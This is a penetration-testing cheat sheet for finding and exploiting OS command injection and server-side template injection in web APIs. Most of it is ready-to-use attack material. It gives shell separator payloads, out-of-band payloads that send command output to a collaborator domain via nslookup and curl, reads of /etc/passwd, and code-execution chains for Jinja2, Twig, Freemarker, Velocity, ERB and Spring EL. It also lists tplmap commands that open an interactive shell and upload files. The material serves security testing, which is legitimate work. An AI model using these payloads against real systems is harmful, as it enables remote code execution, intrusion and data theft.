# OS Command Injection and SSTI in APIs

## OS command injection

### Where to look

Parameters that plausibly reach a shell or exec call:

- network tools exposed as features: `host`, `ip`, `target` (ping,
  traceroute, nslookup, SNMP checks)
- file handling: `filename`, `path`, `format` (convert/ImageMagick, zip,
  ffmpeg, PDF/report generators, `tar` backup endpoints)
- fetchers: `url`, `callback`, `webhook` (wget/curl wrappers)
- anything named `cmd`, `exec`, `run`, `query` in legacy/debug endpoints

### Separator set

Append to the baseline value, keeping it valid where possible
(`192.0.2.10;id` not just `;id`):

```
;id
|id
&&id
||id
$(id)
`id`
%0aid            (URL context)
\nid             (JSON string context — a literal newline after decode)
;id%00           (null-byte truncation on legacy stacks)
```

Windows targets: `&whoami`, `|whoami`, `%0awhoami`, and
`& ping -n 6 127.0.0.1` for timing. Argument injection when separators are
filtered: inject flags instead (`-oG out.txt` to nmap-wrappers, `--to=...`
to sendmail wrappers).

### Blind confirmation

**Time**: `;sleep 5` / `|sleep 5` / `$(sleep 5)` / `& ping -n 6 127.0.0.1`.
Confirm twice, then with `sleep 10` — the delta must scale with the payload.

**OOB (the strong proof)** — run an interactsh client and watch for hits:

```
interactsh-client -v
# note the generated domain, e.g. xxxxxxxx.oast.example.net
```

Payloads (DNS exfil carries command output in the label):

```
;nslookup xxxxxxxx.oast.example.net
;nslookup $(whoami).xxxxxxxx.oast.example.net
;curl http://xxxxxxxx.oast.example.net/$(id|base64 -w0)
&nslookup %USERNAME%.xxxxxxxx.oast.example.net    (Windows)
```

A DNS/HTTP interaction in `interactsh-client` output
(`[dns] Received DNS interaction (A) from 198.51.100.7`) with your unique
subdomain is full confirmation; a label containing command output proves
execution context. Burp Collaborator works identically.

In-band proof when output is reflected: `;id`, `;cat /etc/passwd | head -1`,
`;uname -a` — one line is enough. CWE-78.

## SSTI

### Detection polyglots

Seed every string field that is **reflected** (in the response, an email, a
PDF, an error page) with:

```
{{7*7}}      ${7*7}      #{7*7}      <%=7*7%>      {{7*'7'}}      ${{7*7}}
```

Use odd numbers (`{{1337*31337}}` → `41897569`) to avoid false positives on
bodies that already contain `49`. Decision tree on the response:

| Response | Engine family |
|---|---|
| `{{7*7}}` → `49`, `{{7*'7'}}` → `7777777` | Jinja2 (Python) |
| `{{7*7}}` → `49`, `{{7*'7'}}` → `49` | Twig (PHP) |
| `${7*7}` → `49` | Freemarker (Java), or JSP/Spring EL |
| `#{7*7}` → `49` | Ruby interpolation / Thymeleaf-SpEL variants |
| `<%=7*7%>` → `49` | ERB (Ruby), EJS legacy |
| `${7*7}` errors but `${{7*7}}` → `49` | Spring/Thymeleaf SpEL |
| payload reflected verbatim | no SSTI in this field |

Error messages are fingerprints too: `jinja2.exceptions.TemplateSyntaxError`,
`Twig\Error\SyntaxError`, `freemarker.core.ParseException`.

### Escalation per engine (minimal proof: one `id` output or one file line)

**Jinja2** (Python):

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ ''.__class__.__mro__[1].__subclasses__() }}   → find subprocess.Popen index, then
{{ ''.__class__.__mro__[1].__subclasses__()[X]('id',shell=True,stdout=-1).communicate() }}
File read: {{ ''.__class__.__mro__[1].__subclasses__() }} → _io variants, or popen('cat /etc/passwd|head -1')
```

**Twig** (PHP):

```
{{ ['id']|filter('system') }}
{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}   (Twig <2)
```

**Freemarker** (Java):

```
${"freemarker.template.utility.Execute"?new()("id")}
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
```

**Velocity** (Java):

```
#set($rt=$class.inspect("java.lang.Runtime").type.getRuntime())
#set($proc=$rt.exec("id"))
$proc.waitFor()
#set($is=$proc.getInputStream())...
```

(or the `$class.forName` chain; Velocity escalation is verbose — tplmap it.)

**ERB** (Ruby): `<%= `id` %>`, `<%= IO.popen('id').read %>`

**Spring EL**: `${T(java.lang.Runtime).getRuntime().exec('id')}` (output via
`IOUtils`/scanner chain, or go OOB with `nslookup`).

Payload delivery note: inside a JSON string, `{{...}}` needs no escaping, but
backslashes and double quotes do — JSON-encode the payload exactly once.

### tplmap

```
git clone https://github.com/epinna/tplmap
./tplmap.py -u 'https://api.example.com/v1/render?name=*'
./tplmap.py -u 'https://api.example.com/v1/render' -X POST \
            -d '{"name":"*"}' -H 'Content-Type: application/json'
./tplmap.py -u '...' --engine Jinja2 --os-shell     # interactive shell on confirm
./tplmap.py -u '...' --upload /local/file /tmp/f    # file ops per engine
```

`*` marks the injection point. tplmap reports the engine, the context
(code vs. text), and capabilities (`Shell command execution: ok`). Treat its
`--os-shell` as the escalation step after your own `{{7*7}}` confirmation.

Finding: CWE-1336 (SSTI) / CWE-78 (command injection). Evidence: the request
with the evaluated payload and the response showing `41897569` / command
output / the interactsh hit. Endpoint → `exploited`.
